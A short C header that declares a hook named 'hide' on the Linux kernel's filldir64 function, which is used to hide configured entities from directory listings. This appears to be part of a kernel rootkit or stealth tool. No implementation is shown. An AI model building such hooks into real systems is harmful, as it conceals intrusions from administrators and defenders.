#pragma once

#include <hook.h>

/// @brief Enable/disable the hiding of configured entities from `filldir64`
HOOK_EXTERN(hide, filldir64)
